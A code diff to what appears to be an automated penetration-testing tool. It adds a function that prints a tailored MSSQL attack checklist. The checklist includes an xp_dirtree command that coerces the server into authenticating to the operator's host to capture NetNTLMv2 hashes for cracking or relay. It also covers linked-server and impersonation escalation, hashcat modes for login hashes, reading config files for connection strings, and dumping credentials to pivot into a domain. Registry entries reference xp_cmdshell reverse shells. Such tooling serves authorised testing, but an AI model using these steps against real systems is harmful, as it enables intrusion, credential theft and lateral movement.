@@ -3448,8 +3448,7 @@ _EXPLOIT_STEPS = {
         ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
         ("xp_cmdshell command execution (sysadmin) → foothold", "mssql-exec"),
         ("Loot: DBs, linked servers, sql_login hashes, OPENROWSET file-read", "mssql-loot"),
-        "Coerce the service account's NetNTLM hash (xp_dirtree / xp_fileexist) → crack / relay",
-        "Manual steps & further research",
+        ("Manual steps & further research", "mssql-next"),
     ],
     "psql": [
         "Try postgres with blank / default, then known creds",
@@ -13612,6 +13611,107 @@ def _tool_mssql_loot(ip: str, port: int, proto: str) -> str:
     return f"MSSQL loot — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MSSQL step 5: manual steps & further research (reference only, context-aware) ─
+def _tool_mssql_next(ip: str, port: int, proto: str) -> str:
+    """MSSQL step-5 tool: NOT a scan — a read-only checklist of where to go on MSSQL, with this
+    host's own findings substituted in (confirmed RCE or a sysadmin cred to spawn, NetNTLM coercion,
+    linked-server / EXECUTE AS chains, sql_login hashes to crack, phase CVEs, and unconfirmed ⚠).
+    Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    banner, exe, loot = by_sid.get("mssql-banner", ""), by_sid.get("mssql-exec", ""), by_sid.get("mssql-loot", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+?)(?:  ·|$)", banner, re.M)
+    ver = mv.group(1).strip() if mv else ""
+    creds = _gather_mssql_creds(ip)
+    admins = _gather_mssql_admin(ip)
+    has_rce = "✗ EXEC " in exe
+    hashes = re.findall(r"^✗ HASH (\S+)", loot, re.M)
+    linked = re.findall(r"^✗ LINKED (\S+)", loot, re.M)
+    dbs = re.findall(r"^· DB (\S+)", loot, re.M)
+
+    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
+    reuse_svc = [n for (pnum, n) in ((445, "SMB"), (5985, "WinRM"), (22, "SSH"), (3389, "RDP"))
+                 if (pnum, "tcp") in oports]
+    lhost = _foothold_lhost(ip) or "<YOUR_IP>"
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = f"{DIM}version: {ver or 'unknown'}  ·  creds: {len(creds)}  ·  sysadmin: {'yes' if admins else 'no'}  ·  RCE: {'yes' if has_rce else 'no'}"
+    L = [f"MSSQL {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Get a shell{RESET}")
+    if has_rce or admins:
+        L.append(f"  {CYAN}ready{RESET} {DIM}({'xp_cmdshell RCE' if has_rce else 'sysadmin cred'}) → "
+                 f"Privilege Escalation phase → spawn-shell (r1){RESET}")
+    else:
+        L.append(f"  {DIM}need a sysadmin login — prove creds (r2); non-sa? escalate via B/C below{RESET}")
+
+    L.append(f"\n{BOLD}B. Coerce the service account's NetNTLM (no sysadmin needed){RESET}")
+    L.append(f"  {DIM}start Responder (smb-poison), then force MSSQL to auth to you:{RESET}")
+    L.append(f"  {CYAN}EXEC master..xp_dirtree '\\\\{lhost}\\x';{RESET} {DIM} or xp_fileexist / "
+             f"xp_subdirs — capture NetNTLMv2 → crack, or relay to another host (smb-relay){RESET}")
+
+    L.append(f"\n{BOLD}C. Escalate to sysadmin{RESET}")
+    if linked:
+        L.append(f"  {CYAN}linked servers:{RESET} {', '.join(linked[:6])} "
+                 f"{DIM}→ EXECUTE AT / OPENQUERY; often sa there (rpcout, 'sa' link creds){RESET}")
+    L.append(f"  {DIM}EXECUTE AS LOGIN='sa' if impersonation is granted · TRUSTWORTHY db + db_owner → "
+             f"CREATE stored proc WITH EXECUTE AS OWNER · check IS_SRVROLEMEMBER after each hop{RESET}")
+
+    L.append(f"\n{BOLD}D. Crack & reuse{RESET}")
+    if hashes:
+        L.append(f"  {CYAN}{len(hashes)} sql_login hash(es){RESET} {DIM}({', '.join(hashes[:5])}) → "
+                 f"hashcat -m 1731 (2012+) / -m 131 (2005){RESET}")
+    tgt = ", ".join(reuse_svc) if reuse_svc else "SMB / WinRM / RDP"
+    L.append(f"  {DIM}reuse the service-account / cracked creds on {tgt} (often a domain account){RESET}")
+    if not hashes:
+        L.append(f"  {DIM}no hashes yet — run mssql-loot (r4){RESET}")
+
+    L.append(f"\n{BOLD}E. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — searchsploit '{ver or 'Microsoft SQL Server'}'{RESET}")
+
+    L.append(f"\n{BOLD}F. Loot & pivot{RESET}")
+    if dbs:
+        L.append(f"  {CYAN}databases:{RESET} {', '.join(dbs[:8])}"
+                 + (f" {DIM}+{len(dbs) - 8}{RESET}" if len(dbs) > 8 else ""))
+    L.append(f"  {DIM}OPENROWSET BULK read web.config / app configs for connection strings → other DBs/hosts; "
+             f"xp_cmdshell → dump creds, pivot into the domain{RESET}")
+
+    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}capture/crack the service hash then reuse; if you enabled xp_cmdshell, disable it "
+             f"when done (sp_configure 'xp_cmdshell',0){RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13768,6 +13868,7 @@ _STEP_TOOLS = {
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
     "mssql-shell": ("MSSQL foothold → xp_cmdshell PowerShell reverse shell (spawned)", _tool_mssql_shell),
     "mssql-loot": ("DBs, linked servers, sql_login hashes, OPENROWSET file-read (netexec -q)", _tool_mssql_loot),
+    "mssql-next": ("manual MSSQL steps (context-aware, reference only)", _tool_mssql_next),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13861,6 +13962,7 @@ _STEP_TOOL_RUNS = {
     "mssql-exec":       ("netexec mssql -x", None),
     "mssql-shell":      ("netexec + nc listener", None),
     "mssql-loot":       ("netexec mssql -q", None),
+    "mssql-next":       ("reference · no scan", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -13940,7 +14042,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -13949,7 +14051,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
